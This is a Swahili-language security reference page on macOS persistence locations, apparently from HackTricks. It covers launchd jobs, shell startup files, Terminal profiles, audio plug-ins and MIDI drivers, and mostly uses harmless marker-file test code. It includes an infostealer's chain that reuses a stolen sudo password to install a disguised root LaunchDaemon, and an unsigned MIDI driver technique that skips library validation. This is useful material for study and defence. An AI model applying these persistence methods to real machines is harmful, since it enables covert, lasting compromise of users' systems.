# macOS Kuanzisha Kiotomatiki

{{#include ../banners/hacktricks-training.md}}

Sehemu hii inategemea kwa kiasi kikubwa mfululizo wa blogu [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/). Lengo lake ni kutambua maeneo ambamo kuandika faili kunaweza kusababisha utekelezaji wa code baadaye, tukio linalochochea utekelezaji huo, na ruhusa zinazohitajika. Kuwepo kwa eneo hakuthibitishi kuwa utaratibu huo umewezeshwa. Ukaguzi wa ndani ulioelezwa hapa chini ulifanywa kwenye macOS 26.5.2 (5 Oktoba 2026); hauonyeshi tabia ya kila toleo la macOS.

> [!NOTE]
> “Kuchochewa na uandishi” hakumaanishi kila mara “huendeshwa mara tu baada ya kuandika.” Baadhi ya maeneo husomwa tu wakati wa kuingia, programu mahususi inapowashwa, au mtumiaji anapotekeleza kitendo fulani. Payload inayoweza kuandikwa ndani ya job ambayo tayari imesanidiwa pia ni tofauti na ruhusa ya kusajili job mpya. Fanya majaribio kwenye akaunti au VM inayoweza kutupwa kabla ya kutegemea technique.

## Sandbox Bypass

> [!TIP]
> Hapa unaweza kupata maeneo ya kuanzisha yanayofaa kwa **sandbox bypass**, yanayokuwezesha kutekeleza kitu kwa **kukikiandika kwenye faili** tu na **kusubiri** kitendo **cha kawaida sana**, **muda fulani**, au **kitendo unachoweza kutekeleza kwa kawaida** ukiwa ndani ya sandbox bila kuhitaji ruhusa za root.

### Launchd

- Inafaa kwa sandbox bypass: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Maeneo

- **`/Library/LaunchAgents`**
  - **Kichocheo**: Mtumiaji kuingia (au usajili wa wazi)
  - Inahitaji root
- **`/Library/LaunchDaemons`**
  - **Kichocheo**: Kuwashwa kwa mfumo (au usajili wa wazi)
  - Inahitaji root
- **`/System/Library/LaunchAgents`**
  - **Kichocheo**: Mtumiaji kuingia; eneo la mfumo la Apple lililolindwa
- **`/System/Library/LaunchDaemons`**
  - **Kichocheo**: Kuwashwa kwa mfumo; eneo la mfumo la Apple lililolindwa
- **`~/Library/LaunchAgents`**
  - **Kichocheo**: Kuingia tena

Hakuna eneo la `~/Library/LaunchDaemons` linalochunguzwa na `launchd`. Jobs za kila mtumiaji huwekwa kwenye `~/Library/LaunchAgents`; saraka ya daemon za mfumo ni `/Library/LaunchDaemons`. [Mwongozo wa Apple kuhusu kuanzisha launchd](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html) unaeleza maeneo yanayochunguzwa.

> [!TIP]
> Jambo la kuvutia ni kwamba **`launchd`** ina property list iliyopachikwa katika sehemu ya Mach-o `__Text.__config`, iliyo na huduma nyingine zinazojulikana ambazo launchd lazima ianzishe. Zaidi ya hayo, huduma hizi zinaweza kuwa na `RequireSuccess`, `RequireRun` na `RebootOnSuccess`, kumaanisha kwamba lazima ziendeshwe na zikamilike kwa mafanikio.
>
> Bila shaka, haiwezi kurekebishwa kwa sababu ya code signing.

#### Maelezo na Exploitation

**`launchd`** ndiyo **process** ya **kwanza** inayotekelezwa na kernel ya OX S wakati wa kuwasha mfumo, na ya mwisho kumaliza wakati wa kuzima. Inapaswa kuwa na **PID 1** kila wakati. Process hii **husoma na kutekeleza** usanidi uliobainishwa kwenye **ASEP** **plists** katika:

- `/Library/LaunchAgents`: Agents za kila mtumiaji zilizosakinishwa na msimamizi
- `/Library/LaunchDaemons`: Daemons za mfumo mzima zilizosakinishwa na msimamizi
- `/System/Library/LaunchAgents`: Agents za kila mtumiaji zilizotolewa na Apple.
- `/System/Library/LaunchDaemons`: Daemons za mfumo mzima zilizotolewa na Apple.

Mtumiaji anapoingia, `launchd` hupakia plists zilizo kwenye `~/Library/LaunchAgents` ya mtumiaji huyo kwa kutumia ruhusa za mtumiaji huyo. Jobs huanzishwa kulingana na keys zake; kupakia plist pekee hakumaanishi kwamba process itatekelezwa mara moja.

**Tofauti kuu kati ya agents na daemons ni kwamba agents hupakiwa mtumiaji anapoingia, na daemons hupakiwa mfumo unapowashwa** (kwa kuwa kuna huduma kama ssh zinazohitaji kutekelezwa kabla mtumiaji yeyote hajafikia mfumo). Pia, agents zinaweza kutumia GUI huku daemons zikihitaji kuendeshwa chinichini.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
        <string>com.apple.someidentifier</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>touch /tmp/launched</string>
    </array>
    <key>RunAtLoad</key><true/> <!--Execute at system startup-->
    <key>StartInterval</key>
    <integer>800</integer> <!--Execute each 800s-->
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key><false/> <!--Re-execute if exit unsuccessful-->
        <!--If previous is true, then re-execute in successful exit-->
    </dict>
</dict>
</plist>
```

Kila kipengele cha `ProgramArguments` ni argument tofauti; `launchd` haichanganui string moja kama amri ya shell. Mfano uliosahihishwa hapo juu unaweza kukaguliwa sintaksia bila kuupakia kwa kutumia `plutil -lint /path/to/example.plist`. Angalia ingizo la ndani la `man launchd.plist` kuhusu `ProgramArguments`, `RunAtLoad`, na `KeepAlive`.

#### Vichochezi vya matukio ya faili katika kazi zilizopo

Agent au daemon **ambayo tayari imepakiwa** inaweza kutumia `WatchPaths` kuanza njia iliyotajwa inapobadilika. `QueueDirectories` huanzisha kazi wakati saraka haina tupu; `StartOnMount` huanzisha kazi volume inapowekwa. [Mwongozo wa Apple wa launchd](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html#//apple_ref/doc/uid/10000172i-CH2-SW9) una mifano ya `WatchPaths` na `QueueDirectories`. Kuandika kwenye faili inayofuatiliwa huanzisha **kazi iliyosanidiwa tayari**; huwezesha utekelezaji wa msimbo wowote tu ikiwa mwandishi anaweza pia kudhibiti executable ya kazi, script, au data ambayo kazi hutafsiri. Kuandika tu plist mpya nje ya eneo linalochanganuliwa au kusajiliwa hakuipakii.

PoC hii inayojisafisha husajili **temporary user agent** yenye jina la kipekee, hubadilisha faili yake inayofuatiliwa pekee, kisha huondoa agent. Ilifaulu kuendeshwa kwenye macOS 26.5.2 bila kutoka kwenye akaunti au kuwasha upya:

```python
import os, pathlib, plistlib, subprocess, tempfile, time, uuid

label = f"org.hacktricks.watchtest.{uuid.uuid4().hex}"
target = f"gui/{os.getuid()}"
with tempfile.TemporaryDirectory(prefix="ht-watch-") as root:
    base = pathlib.Path(root)
    watched, marker, plist = base / "watched", base / "ran", base / "agent.plist"
    watched.write_text("before\n")
    plist.write_bytes(plistlib.dumps({
        "Label": label,
        "ProgramArguments": ["/usr/bin/touch", str(marker)],
        "WatchPaths": [str(watched)],
        "RunAtLoad": False,
    }))
    subprocess.run(["launchctl", "bootstrap", target, str(plist)], check=True)
    try:
        marker.unlink(missing_ok=True)
        watched.write_text("after\n")
        for _ in range(30):
            if marker.exists():
                break
            time.sleep(0.1)
        print("watch fired:", marker.exists())
    finally:
        subprocess.run(["launchctl", "bootout", f"{target}/{label}"], check=True)
```

Uendeshaji wa ndani ulionyesha `watch fired: True`, na `bootout` ilifaulu. `launchctl bootstrap` inatumika hapa tu ndani ya PoC iliyotengwa; **haihitajiki** kwa job ambayo tayari imepakiwa. Ili kutathmini job iliyopo kwa usalama, soma plist yake na njia ya `ProgramArguments` iliyotatuliwa, kisha uangalie kama executable au faili inayotafsiriwa husika inaweza kuandikika bila kuibadilisha.

Kuna hali ambapo **agent inahitaji kutekelezwa kabla ya mtumiaji kuingia**, hizi huitwa **PreLoginAgents**. Kwa mfano, hii ni muhimu ili kutoa teknolojia saidizi wakati wa kuingia. Pia zinaweza kupatikana katika `/Library/LaunchAgents`(tazama [**hapa**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) mfano).

> [!TIP]
> Faili mpya za usanidi wa Daemons au Agents **zitapakiwa baada ya kuwasha upya mara inayofuata au kwa kutumia** `launchctl load <target.plist>`. **Pia inawezekana kupakia faili za .plist bila kiendelezi hicho** kwa kutumia `launchctl -F <file>` (hata hivyo, faili hizo za plist hazitapakiwa kiotomatiki baada ya kuwasha upya).\
> Pia inawezekana **kupakua** kwa kutumia `launchctl unload <target.plist>` (mchakato unaoelekezwa na faili hiyo utasitishwa),
>
> Ili **kuhakikisha** kwamba hakuna **chochote** (kama vile override) **kinachozuia** **Agent** au **Daemon** **kuendesha**, tekeleza: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`

Orodhesha agents na daemons zote zilizopakiwa na mtumiaji wa sasa:

```bash
launchctl list
```

#### Mfano wa msururu hasidi wa LaunchDaemon (kutumia tena nenosiri)

Infostealer ya hivi karibuni ya macOS ilitumia tena **nenosiri la sudo lililonaswa** ili kuweka user agent na LaunchDaemon ya root:<sup>[[1]](#references)</sup>

- Andika mzunguko wa agent kwenye `~/.agent` na uufanye utekelezeke.
- Tengeneza plist katika `/tmp/starter` inayoelekeza kwa agent hiyo.
- Tumia tena nenosiri lililoibwa kupitia `sudo -S` ili kuinakili kwenye `/Library/LaunchDaemons/com.finder.helper.plist`, kuweka `root:wheel`, na kuipakia kwa `launchctl load`.
- Anzisha agent kimyakimya kupitia `nohup ~/.agent >/dev/null 2>&1 &` ili kuitenganisha na matokeo.

```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> plist ya daemon iliyowekwa kwenye `/Library/LaunchDaemons` haiwi salama kwa kuipa umiliki wa mtumiaji. `launchd` huhitaji umiliki na ruhusa zinazofaa kwa kazi za mfumo na inaweza kukataa plist isiyo salama. Daemon inayomilikiwa na root kwa kawaida huendeshwa kama root isipokuwa usanidi wake uchague akaunti nyingine. Kagua `UserName`, `GroupName`, umiliki na taarifa za uchunguzi za `launchctl`; usikisie utambulisho wa mtumiaji anayeendesha kwa kutegemea jina la mmiliki wa plist pekee.

#### Maelezo zaidi kuhusu launchd

**`launchd`** ni mchakato wa kwanza wa user mode unaoanzishwa kutoka kwa **kernel**. Mchakato lazima uanze **kwa mafanikio** na **hauwezi kutoka au kuharibika**. Pia **umelindwa** dhidi ya baadhi ya **ishara za kuua michakato**.

Mojawapo ya mambo ya kwanza ambayo `launchd` hufanya ni **kuanzisha** **daemon** zote kama vile:

- **Daemon za kipima muda** zinazotekelezwa kulingana na muda:
  - `com.apple.atrun.plist` huendesha `/usr/libexec/atrun` kwa `StartInterval = 30` sekunde katika macOS 26.5.2; hali yake halisi ya kuwashwa inaweza kutofautiana na ufunguo wa `Disabled` wa plist kwa sababu launchd huhifadhi mipangilio ya kubatilisha kando.
  - `com.vix.cron.plist` huendesha `/usr/sbin/cron` wakati `/usr/lib/cron/tabs` ina kazi. `com.apple.systemstats.daily` ni huduma tofauti iliyoratibiwa, si daemon ya cron.
- **Daemon za mtandao** kama vile:
  - `org.cups.cups-lpd`: Husikiliza TCP (`SockType: stream`) kwa `SockServiceName: printer`
    - SockServiceName lazima iwe bandari au huduma iliyoorodheshwa kwenye `/etc/services`
  - `com.apple.xscertd.plist`: Husikiliza TCP kwenye bandari 1640
- **Daemon za njia** zinazoendeshwa njia maalum inapobadilika:
  - `com.apple.postfix.master`: Hukagua njia `/etc/postfix/aliases`
- **Daemon za arifa za IOKit**:
  - `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port:**
  - `com.apple.xscertd-helper.plist`: Inaonyesha jina `com.apple.xscertd.helper` kwenye ingizo la `MachServices`
- **UserEventAgent:**
  - Hii ni tofauti na iliyotangulia. Husababisha launchd kuanzisha programu kutokana na tukio maalum. Hata hivyo, katika hali hii, binary kuu inayohusika si `launchd` bali `/usr/libexec/UserEventAgent`. Hupakia plugins kutoka kwenye folda yenye vizuizi vya SIP /System/Library/UserEventPlugins/ ambamo kila plugin huonyesha initializer yake kwenye ufunguo wa `XPCEventModuleInitializer` au, kwa plugins za zamani, kwenye dict ya `CFPluginFactories` chini ya ufunguo `FB86416D-6164-2070-726F-70735C216EC0` wa `Info.plist`.

### shell startup files

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)<sup>[[2]](#references)</sup>\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

- Inafaa kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
  - Lakini unahitaji kupata programu yenye TCC bypass inayoendesha shell inayopakia faili hizi

#### Locations

- **`~/.zshenv`** (au **`~/.zshenv.zwc`** iliyokusanywa hivi karibuni zaidi)
  - **Trigger**: Kila uendeshaji wa kawaida wa zsh, ikijumuisha `zsh -c` isiyoingiliana; `zsh -f` huruka faili za uanzishaji za mtumiaji.
- **`~/.zshrc`**
  - **Trigger**: zsh inayoingiliana huanza.
- **`~/.zprofile`, `~/.zlogin`**
  - **Trigger**: zsh ya kuingia huanza; faili hizi husomwa kabla na baada ya `.zshrc`, mtawalia.
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
  - **Trigger**: Fungua terminal yenye zsh
  - Root inahitajika
- **`~/.zlogout`**
  - **Trigger**: zsh ya kuingia inatoka kawaida, si kila kutoka kwa terminal au shell.
- **`/etc/zlogout`**
  - **Trigger**: Toka kwenye terminal yenye zsh
  - Root inahitajika
- Huenda kuna zaidi kwenye: **`man zsh`**
- **`~/.bashrc`**
  - **Trigger**: Anzisha Bash inayoingiliana **isiyo ya kuingia**. Bash inayoingiliana ya kuingia huisoma tu ikiwa faili ya kuingia imeiingiza waziwazi.
- **`~/.bash_profile`, `~/.bash_login`, `~/.profile`**
  - **Trigger**: Anzisha Bash ya kuingia; faili ya kwanza inayoweza kusomwa katika mpangilio huo huendeshwa. `~/.profile` hurukwa ikiwa mojawapo ya faili za awali ipo.
- **`/etc/profile`**
  - **Trigger**: Anzisha Bash ya kuingia; kuibadilisha kunahitaji root.
- **`~/.tcshrc`** au, ikiwa haipo, **`~/.cshrc`**
  - **Trigger**: Anzisha `tcsh`, ikijumuisha `tcsh -c` isiyoingiliana kwenye Mac hii. Mtumiaji lazima aendeshe `tcsh` mwenyewe; si shell chaguomsingi ya macOS.
- **`~/.login`**
  - **Trigger**: Anzisha `tcsh` ya kuingia baada ya faili yake ya rc.
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
  - **Trigger**: Zinatarajiwa kuwashwa na xterm, lakini **haijasakinishwa** na hata baada ya kusakinishwa kosa hili hutokea: xterm: `DISPLAY is not set`<sup>[[3]](#references)</sup>

#### Description & Exploitation

Unapoanzisha mazingira ya shell kama `zsh` au `bash`, **baadhi ya faili za uanzishaji huendeshwa**. Kwa sasa macOS hutumia `/bin/zsh` kama shell chaguomsingi. Ikiwa Terminal au SSH itaanzisha shell ya kuingia au inayoingiliana hutegemea usanidi wake; usidhani kwamba kila faili iliyo hapo juu huendeshwa katika kila kipindi. Ingawa `bash` na `sh` pia zinapatikana kwenye macOS, lazima ziitishwe waziwazi ili zitumike.<sup>[[2]](#references)</sup> [Rejeleo la faili za uanzishaji za zsh](https://zsh.sourceforge.io/Doc/Release/Files.html) linaeleza mpangilio, ubatilishaji wa `ZDOTDIR` na kanuni ya `.zwc`.

Jaribio lifuatalo la kusoma pekee lilitumia `ZDOTDIR` ya muda kwenye macOS 26.5.2. Linaonyesha faili zipi za mtumiaji zilisomwa; hakuna faili halisi ya uanzishaji wa shell iliyobadilishwa:

```bash
lab=$(mktemp -d)
for name in zshenv zprofile zshrc zlogin zlogout; do
  printf 'print -r -- %s >> "$ZDOTDIR/seen"\n' "$name" > "$lab/.$name"
done
for flags in -c -ic -lc -lic; do
  : > "$lab/seen"
  ZDOTDIR="$lab" /bin/zsh "$flags" ':'
  printf '%s: %s\n' "$flags" "$(tr '\n' ' ' < "$lab/seen")"
done
rm -r "$lab"
```

Mpangilio ulioonekana ulikuwa `-c`: `zshenv`; `-ic`: `zshenv zshrc`; `-lc`: `zshenv zprofile zlogin`; `-lic`: `zshenv zprofile zshrc zlogin zlogout`. `ZDOTDIR` lazima iwe tayari inaelekeza kwenye saraka mbadala; kuandika faili tu kwenye saraka yoyote hakutoshi.

[Rejeleo la Bash kuhusu faili za kuanzisha](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html) linatofautisha shell za login na za interactive. Kwenye mashine ya majaribio ya macOS 26.5.2, `HOME` iliyotengwa iliyokuwa na faili zote nne za kuanzisha za mtumiaji ilitoa matokeo haya: `bash -c` → hakuna; `bash -ic` → `.bashrc`; `bash -lc` na `bash -lic` → `.bash_profile` pekee. Kuondoa `.bash_profile` kulifanya Bash ya login isome `.bash_login`, kisha `.profile` ilipoondolewa pia. `BASH_ENV` inaweza kuelekeza Bash isiyo ya interactive kwenye faili, lakini kigezo hicho cha mazingira lazima kiwe tayari kimewekwa kwenye mchakato unaoiita. Amri ya wazi ya `exit` kutoka kwa Bash ya login inaweza pia kupakia `~/.bash_logout`.

Mwongozo wa ndani wa `tcsh(1)` unaeleza mpangilio wake tofauti wa kuanzisha. Kwa kutumia `HOME` ya muda, `/bin/tcsh -c :` ilisoma `.tcshrc`, au `.cshrc` ikiwa `.tcshrc` haikuwepo. `tcsh` ya login ya muda ilisoma `.tcshrc` na `.login`. Majaribio haya yaliunda na kuondoa faili za muda pekee.

### Programu Zinazofunguliwa Tena

> [!CAUTION]
> Kuweka mipangilio ya exploitation iliyoonyeshwa na kisha kutoka na kuingia tena, au hata kuwasha upya, hakukuendesha programu kwenye majaribio. Huenda programu ikahitaji kuwa inaendeshwa wakati hatua hizi zinapotekelezwa.

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)<sup>[[4]](#references)</sup>

- Muhimu kwa kukwepa sandbox: [✅](https://emojipedia.org/check-mark-button)
- Kukwepa TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
  - **Kichochezi**: Kuanzisha upya na kufungua programu tena

#### Maelezo na Exploitation

Programu zote zitakazofunguliwa tena ziko ndani ya plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`<sup>[[4]](#references)</sup>

Kwa hiyo, ili programu zinazofunguliwa tena zianzishe yako, unahitaji tu **kuongeza programu yako kwenye orodha**.

UUID inaweza kupatikana kwa kuorodhesha saraka hiyo au kwa kutumia `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Ili kuangalia programu zitakazofunguliwa tena, unaweza kufanya hivi:

```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

Ili **kuongeza programu kwenye orodha hii** unaweza kutumia:

```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
    ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

### Mapendeleo ya Terminal

Writeup: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)<sup>[[5]](#references)</sup>

- Muhimu kwa bypass ya sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Terminal ilikuwa na ruhusa za FDA za mtumiaji anayeitumia

#### Mahali

- **`~/Library/Preferences/com.apple.Terminal.plist`**
  - **Kichochezi**: Fungua dirisha au kichupo kipya cha Terminal ukitumia profile ambayo mipangilio yake ya Shell ina amri ya kuanzisha

#### Maelezo na Utumiaji

Katika **`~/Library/Preferences`** huhifadhiwa mapendeleo ya mtumiaji kwa Applications. Baadhi ya mapendeleo haya yanaweza kuwa na usanidi wa **kutekeleza applications/scripts nyingine**.<sup>[[5]](#references)</sup>

Kwa mfano, Terminal inaweza kutekeleza amri wakati wa kuanzisha:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Usanidi huu huonekana kwenye faili **`~/Library/Preferences/com.apple.Terminal.plist`** kama ifuatavyo:

```bash
[...]
"Window Settings" => {
    "Basic" => {
      "CommandString" => "touch /tmp/terminal_pwn"
      "Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
      "FontAntialias" => 1
      "FontWidthSpacing" => 1.004032258064516
      "name" => "Basic"
      "ProfileCurrentVersion" => 2.07
      "RunCommandAsShell" => 0
      "type" => "Window Settings"
    }
[...]
```

Ikiwa wasifu husika una amri ya startup na Terminal inasoma mapendeleo hayo, kipindi kipya kinachotumia wasifu huo kinaweza kuitekeleza. [Mwongozo wa sasa wa Terminal wa Apple](https://support.apple.com/guide/terminal/trmlshll/mac) unaeleza amri ya **Shell → Startup** kwa kila wasifu. Kufungua Terminal tu bila kuanzisha kipindi kipya kinachotumia wasifu huo hakutoshi. Mabadiliko ya mapendeleo yaliyo hapa chini **hayakutekelezwa** kwenye Mac ya utafiti.

Unaweza kuongeza hili kupitia cli kwa kutumia:

```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```

### Terminal Scripts / Viendelezi vingine vya faili

- Ni muhimu kwa bypass ya sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Terminal inaweza kutumiwa kupata ruhusa za FDA za mtumiaji

#### Mahali

- **Popote**
  - **Kichochezi**: Fungua faili husika ya `.terminal`, `.command`, au `.tool`

#### Maelezo na Utekelezaji

Mtumiaji akifungua faili ya mipangilio ya **`.terminal`**, Terminal inaweza kuunda session kutoka kwenye profile yake; faili za **`.command`** na **`.tool`** zinazoweza kutekelezwa pia zinaweza kufunguka kwenye Terminal. Hiki ni kichochezi cha kufungua faili kwa uwazi, si utekelezaji unaotokana tu na kufungua Terminal. Ufikiaji wowote wa TCC uliorithiwa hutegemea ruhusa ambazo Terminal imepewa hasa na operesheni inayojaribiwa. Mfano wa kihistoria ulio hapa chini haukuendeshwa kwenye Mac iliyotumika kwa utafiti.

Jaribu hivi:

```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>CommandString</key>
	<string>/usr/bin/touch /tmp/ht-terminal-file-marker</string>
	<key>ProfileCurrentVersion</key>
	<real>2.0600000000000001</real>
	<key>RunCommandAsShell</key>
	<false/>
	<key>name</key>
	<string>exploit</string>
	<key>type</key>
	<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# After inspecting the marker, remove the disposable file and marker:
rm -f /tmp/test.terminal /tmp/ht-terminal-file-marker
```

Unaweza pia kutumia viendelezi **`.command`**, **`.tool`**, vyenye maudhui ya kawaida ya shell script; navyo vitafunguliwa na Terminal.

> [!CAUTION]
> Ikiwa terminal ina **Full Disk Access**, itaweza kukamilisha kitendo hicho (kumbuka kuwa amri itakayoendeshwa itaonekana kwenye dirisha la terminal).

### Programu-jalizi za Sauti

Maelezo: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)<sup>[[6]](#references)</sup>\
Maelezo: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)<sup>[[7]](#references)</sup>

- Yanafaa kukwepa sandbox: [✅](https://emojipedia.org/check-mark-button)
- Kukwepa TCC: [🟠](https://emojipedia.org/large-orange-circle)
  - Unaweza kupata ufikiaji wa ziada wa TCC

#### Mahali

- **`/Library/Audio/Plug-Ins/HAL`**
  - Root inahitajika
  - **Kichochezi**: Seva ya Core Audio hupakia programu-jalizi ya kifaa cha HAL inayooana; kuwasha upya seva kunaweza kusababisha ugunduzi upya
- **`/Library/Audio/Plug-ins/Components`**
  - Root inahitajika
  - **Kichochezi**: Programu mwenyeji wa sauti hugundua na kuanzisha Audio Unit iliyosakinishwa
- **`~/Library/Audio/Plug-ins/Components`**
  - **Kichochezi**: Programu mwenyeji wa sauti hugundua na kuanzisha Audio Unit iliyosakinishwa
- **`/System/Library/Components`**
  - Mahali yanayotolewa na Apple na kulindwa na mfumo
  - **Kichochezi**: Programu mwenyeji wa sauti huanzisha kipengele cha mfumo kinacholingana

#### Maelezo

Kulingana na maelezo yaliyotangulia, inawezekana **kukompaili baadhi ya programu-jalizi za sauti** na kuzifanya zipakiwe.<sup>[[6]](#references)[[7]](#references)</sup>

Programu-jalizi za vifaa vya HAL na Audio Units hutumia njia tofauti za upakiaji. [Mwongozo wa Apple wa kupangisha Audio Unit](https://developer.apple.com/library/archive/documentation/MusicAudio/Conceptual/CoreAudioOverview/ARoadmaptoCommonTasks/ARoadmaptoCommonTasks.html) unasema kuwa programu mwenyeji lazima ipate na kuanzisha kipengele; kunakili kipengele kwenye saraka inayochanganuliwa au kuwasha upya `coreaudiod` pekee hakuthibitishi kuwa kitatekelezwa. Programu-jalizi za AUv2 huendeshwa ndani ya mchakato wa programu mwenyeji, ilhali [mwongozo wa sasa wa Apple kuhusu Audio Unit](https://developer.apple.com/documentation/audiotoolbox/incorporating-audio-effects-and-instruments) unasema kuwa kwa chaguomsingi AUv3 huendeshwa katika mchakato tofauti kwenye macOS. Masharti ya sahihi, sandbox na uthibitishaji wa maktaba hutegemea programu mwenyeji. Hakuna programu-jalizi ya sauti iliyosakinishwa au kutekelezwa kwenye Mac ya utafiti.

### Viendeshi vya CoreMIDI (MIDIServer)

Maelezo: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- Yanafaa kukwepa sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Msimbo wako huendeshwa ndani ya mchakato wa `MIDIServer`, wala si ndani ya sandbox ya programu yako
- Kukwepa TCC: [🔴](https://emojipedia.org/large-red-circle)
  - `MIDIServer` huendeshwa chini ya wasifu wake wa sandbox wa `seatbelt`

#### Mahali

- **`~/Library/Audio/MIDI Drivers/*.plugin`**
  - Haihitaji root (mtumiaji anaweza kuandika)
  - **Kichochezi**: `MIDIServer` inapoanzishwa (upya). Huzinduliwa inapohitajika mara ya kwanza mchakato wowote unapotumia CoreMIDI (kufungua *Audio MIDI Setup*, GarageBand, DAW, au ukurasa unaotumia WebMIDI)
- **`/Library/Audio/MIDI Drivers/*.plugin`**
  - Root inahitajika
  - **Kichochezi**: sawa na hapo juu

#### Maelezo na Unyonyaji

`MIDIServer` ya Apple (`/System/Library/Frameworks/CoreMIDI.framework/MIDIServer`) hupakia vifurushi vya **viendeshi** vya MIDI kutoka kwenye saraka za `Audio/MIDI Drivers`. Binary hiyo imesainiwa na Apple, lakini inakuja na entitlement ya `com.apple.security.cs.disable-library-validation`; kwa hiyo, itapakia kifurushi **kisichosainiwa au kilichosainiwa kwa njia ya ad-hoc na timu tofauti**, na hivyo kuruhusu utekelezaji wa msimbo ndani ya mchakato tofauti unaomilikiwa na Apple **bila root**.<sup>[[53]](#references)</sup>

Imethibitishwa kwenye macOS 26 (kusoma pekee):

```bash
# user-writable, no root needed
ls -ld ~/Library/"Audio/MIDI Drivers"            # exists, owned by the user
codesign -d --entitlements :- /System/Library/Frameworks/CoreMIDI.framework/MIDIServer 2>/dev/null \
  | grep disable-library-validation              # -> com.apple.security.cs.disable-library-validation
```

Driver ni bundle ya kawaida inayotoa factory ya `MIDIDriverInterface`; kuweka payload ndani ya factory/constructor huifanya iendeshwe mara tu `MIDIServer` inapoorodhesha drivers. Iunde, iweke kama `~/Library/Audio/MIDI Drivers/Evil.plugin`, kisha uanzishe upakiaji bila kutoka kwenye akaunti au kuwasha upya:

```bash
# starts MIDIServer, which scans the driver directories
open -a "Audio MIDI Setup"
```

### QuickLook Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)<sup>[[8]](#references)</sup>

- Husaidia kukwepa sandbox: [✅](https://emojipedia.org/check-mark-button)
- Kukwepa TCC: [🟠](https://emojipedia.org/large-orange-circle)
